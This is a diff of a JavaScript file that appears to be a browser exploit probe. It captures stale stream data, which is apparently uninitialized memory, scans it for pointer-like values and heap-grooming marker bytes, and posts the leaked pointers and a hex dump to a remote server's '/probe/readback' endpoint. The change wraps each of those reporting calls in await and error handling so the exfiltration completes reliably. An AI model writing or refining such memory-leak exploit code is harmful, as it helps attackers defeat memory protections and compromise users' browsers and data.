@@ -778,14 +778,17 @@ async function run() {
     }
 
     // POST stream capture summary
-    fetch(S + '/probe/readback', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            session: sid, slot: -2, source: 'stale-stream-capture',
-            total_bytes: staleTotal, chunks: staleChunks.length
-        })
-    });
+    try {
+        await fetch(S + '/probe/readback', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                session: sid, slot: -2, source: 'stale-stream-capture',
+                total_bytes: staleTotal, chunks: staleChunks.length
+            })
+        });
+        log('[+] Posted capture summary', 'info');
+    } catch(pe) { log('POST err: ' + pe.message, 'err'); }
 
     // Analyze captured stale data
     if (staleTotal > 0) {
@@ -837,19 +840,21 @@ async function run() {
                 log('  +0x' + p.off.toString(16) + ': ' + hex + ' (' + p.kind + ')', 'err');
             }
             // Report to server
-            fetch(S + '/probe/readback', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    session: sid, slot: -1, source: 'stale-stream',
-                    total_bytes: staleTotal, pointer_count: ptrs.length,
-                    pointers: ptrs.slice(0, 50).map(p => ({
-                        offset: p.off,
-                        value: '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0'),
-                        kind: p.kind
-                    }))
-                })
-            });
+            try {
+                await fetch(S + '/probe/readback', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session: sid, slot: -1, source: 'stale-stream',
+                        total_bytes: staleTotal, pointer_count: ptrs.length,
+                        pointers: ptrs.slice(0, 50).map(p => ({
+                            offset: p.off,
+                            value: '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0'),
+                            kind: p.kind
+                        }))
+                    })
+                });
+            } catch(pe) { log('POST err: ' + pe.message, 'err'); }
         } else {
             log('No pointer-like values in first scan', 'warn');
             // Check for groom marker bytes (0x40-0x5F from slots 0-31)
@@ -868,21 +873,24 @@ async function run() {
                 }
             }
             // POST summary back to server for logging
-            fetch(S + '/probe/readback', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    session: sid, slot: -1, source: 'stale-stream',
-                    total_bytes: staleTotal, chunks: staleChunks.length,
-                    non_zero_in_4k: nonZero, unique_bytes: uniqueBytes.size,
-                    marker_count: markers.length,
-                    markers: Object.fromEntries(markers.map(m => [
-                        '0x' + parseInt(m).toString(16), markerHits[m]
-                    ])),
-                    hex: Array.from(merged.slice(0, 256)).map(
-                        b => b.toString(16).padStart(2,'0')).join('')
-                })
-            });
+            try {
+                await fetch(S + '/probe/readback', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session: sid, slot: -1, source: 'stale-stream',
+                        total_bytes: staleTotal, chunks: staleChunks.length,
+                        non_zero_in_4k: nonZero, unique_bytes: uniqueBytes.size,
+                        marker_count: markers.length,
+                        markers: Object.fromEntries(markers.map(m => [
+                            '0x' + parseInt(m).toString(16), markerHits[m]
+                        ])),
+                        hex: Array.from(merged.slice(0, 256)).map(
+                            b => b.toString(16).padStart(2,'0')).join('')
+                    })
+                });
+                log('[+] Posted analysis to server', 'info');
+            } catch(pe) { log('POST err: ' + pe.message, 'err'); }
         }
     }
 
